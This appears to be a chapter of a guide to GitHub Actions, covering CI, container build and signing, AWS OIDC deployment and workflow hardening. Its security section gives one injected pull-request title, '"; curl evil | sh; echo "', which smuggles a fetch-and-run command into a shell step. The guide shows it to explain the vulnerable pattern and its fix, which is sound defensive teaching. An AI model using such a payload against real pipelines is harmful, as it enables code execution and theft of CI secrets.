## Workflow basics

Workflows live in `.github/workflows/*.yml`. Each has triggers (`on`), one or more jobs, each job runs on a runner (GitHub-hosted or self-hosted) and consists of steps that run shell commands or reusable actions.

@file: .github/workflows/ci.yml
```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

# Default: read-only token. Grant more only per job.
permissions:
  contents: read

concurrency:
  # Cancel superseded runs on the same branch/PR to save minutes.
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test -- --coverage --reporters=default --reporters=jest-junit
        env:
          CI: "true"
      - name: Upload test report
        if: always()
        uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
        with:
          name: junit-node${{ matrix.node }}
          path: junit.xml
          retention-days: 7
```

Points worth noticing: the top-level `permissions` block makes the automatic `GITHUB_TOKEN` read-only; `concurrency` cancels stale runs; the matrix runs the suite on two runtimes in parallel; `cache: npm` restores the dependency cache keyed by the lockfile; the test report is uploaded even on failure (`if: always()`); and every action is pinned to a full commit SHA with the version in a comment. A tag like `@v4` can be moved by the action's maintainer (or an attacker who compromises them) to point at different code; a SHA cannot.

## Building and publishing a container image

@file: .github/workflows/build.yml
```yaml
name: Build and publish

on:
  push:
    branches: [main]

permissions:
  contents: read
  packages: write      # push to GitHub Container Registry
  id-token: write      # OIDC token for signing / cloud auth

jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: docker/setup-buildx-action@c47758b77c9736f4b2ef4073d4d51994fabfe349 # v3.7.1
      - uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@369eb591f429131d6889c46b94e711f089e6ca96 # v5.6.1
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,format=long
            type=ref,event=branch
      - id: push
        uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true
      - name: Sign image (keyless)
        uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da # v3.7.0
      - run: cosign sign --yes ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
```

The image is tagged with the long git SHA (immutable) and the branch name (mutable, for convenience only). `provenance: true` and `sbom: true` attach build provenance and a software bill of materials; `cosign sign` with the workflow's OIDC identity produces a signature that deploy-time policy can verify (chapter 9). The job exposes the digest as an output so downstream deploy jobs reference the exact image.

## Deploying to AWS with OIDC, not access keys

Long-lived AWS access keys stored as repository secrets are the most common serious CI misconfiguration: they leak in logs, forks and compromised actions, and they never expire. Instead, GitHub issues the workflow a short-lived OIDC token; AWS trusts GitHub's OIDC provider for a specific repository and branch and exchanges the token for temporary role credentials.

@file: terraform/github-oidc.tf
```hcl
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"] # AWS now validates GitHub's cert chain; the value is still required by the API
}

data "aws_iam_policy_document" "deploy_trust" {
  statement {
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      # Only the production environment of this one repository may assume the role.
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      values   = ["repo:acme/portal:environment:production"]
    }
  }
}

resource "aws_iam_role" "deploy_prod" {
  name                 = "gha-portal-deploy-prod"
  assume_role_policy   = data.aws_iam_policy_document.deploy_trust.json
  max_session_duration = 3600
}
# Attach a least-privilege policy: ecs:UpdateService on one service, ecr:* on one repo, etc.
```

@file: .github/workflows/deploy.yml
```yaml
name: Deploy

on:
  workflow_run:
    workflows: [Build and publish]
    types: [completed]
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  staging:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-24.04
    environment: staging
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-portal-deploy-staging
          aws-region: eu-west-1
      - run: ./scripts/deploy.sh staging ${{ github.event.workflow_run.head_sha }}

  production:
    needs: staging
    runs-on: ubuntu-24.04
    environment: production        # protection rules: required reviewers, branch restriction, wait timer
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-portal-deploy-prod
          aws-region: eu-west-1
      - run: ./scripts/deploy.sh production ${{ github.event.workflow_run.head_sha }}
```

The `sub` claim condition binds the role to the `production` environment of one repository, so a workflow on a feature branch, a fork, or another repository cannot assume it. The production job's `environment: production` applies the protection rules configured in repository settings: required reviewers, deployment branch restrictions and optional wait timers. This is where the "approval gate" from chapter 1 lives.

## Securing workflows

:::security The pipeline is production
Anyone who can run code in your pipeline can usually reach your artefact registry and cloud credentials. Treat workflow files with the same review rigour as application code and assume pull requests are hostile.
:::

**Untrusted pull requests**: `pull_request` from a fork runs with a read-only token and no secrets, which is safe. `pull_request_target` runs in the context of the base branch *with* secrets; checking out and executing PR code under it is a well-known full compromise. Avoid `pull_request_target` unless you fully understand it, and never run PR-controlled code in it.

**Script injection**: expressions like `${{ github.event.pull_request.title }}` are substituted into the shell script *as text* before it runs. A title of `"; curl evil | sh; echo "` executes. Pass untrusted values through environment variables instead:

```yaml
# Vulnerable
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe: the value is an environment variable, never interpolated into the script
- run: echo "Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

**Permissions**: set `permissions: contents: read` at the top and grant specific scopes per job. Avoid `write-all`.

**Pin actions to SHAs** and let Dependabot update the pins. Prefer actions from verified creators; review third-party action source before adopting.

**Secrets**: use environment-scoped secrets so staging jobs cannot read production secrets; never `echo` secrets (masking is best effort); rotate when a workflow that had access was compromised; prefer OIDC over stored cloud credentials entirely.

**Self-hosted runners**: ephemeral (one job per VM or container), never on persistent machines for public repositories, isolated network, no production access beyond what the job needs.

**Branch protection and rulesets**: require PR reviews, status checks and signed commits on main; block force-pushes; require the CI workflow to pass before merge; restrict who can modify `.github/workflows/`.

## Reusable workflows and composite actions

Repeated YAML drifts. Factor shared logic into reusable workflows (`on: workflow_call`) in a central repository and call them with inputs, or into composite actions for step sequences. Version them with tags and pin consumers to SHAs. An organisation-level "golden" build workflow is how a platform team gives every service the same security scans and provenance without each team re-implementing them.

## Debugging workflows

- Re-run with debug logging (`ACTIONS_STEP_DEBUG=true` as a secret) to see expression evaluation.
- Print the event payload (`toJSON(github.event)`) once when designing triggers, then remove it.
- Run the same commands locally in the same container image; tools like `act` approximate the runner but differ in subtle ways.
- Check runner tool versions (`node --version`, `docker version`) when results differ from local.
- Read `needs` and `if` carefully: a skipped job causes dependents to skip silently unless `if: always()` or `!cancelled()` is used.
